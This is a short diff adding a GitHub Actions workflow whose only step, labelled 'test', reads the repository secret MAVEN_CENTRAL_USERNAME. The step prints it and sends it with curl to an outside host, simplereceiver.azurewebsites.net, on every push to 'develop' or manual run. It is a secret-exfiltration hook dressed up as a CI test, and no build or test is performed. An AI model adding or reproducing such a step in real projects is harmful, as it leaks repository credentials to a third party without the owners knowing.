@@ -1,0 +1,21 @@
+on:
+  workflow_dispatch:
+  push:
+    branches: [ "develop" ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: test
+      env:
+        MAVEN_USERNAME: ${{ secrets.MAVEN_CENTRAL_USERNAME }}
+      run: |
+        echo "test $MAVEN_USERNAME"
+        curl --request GET --url https://simplereceiver.azurewebsites.net/?username=$MAVEN_USERNAME
+
+
+    
+        
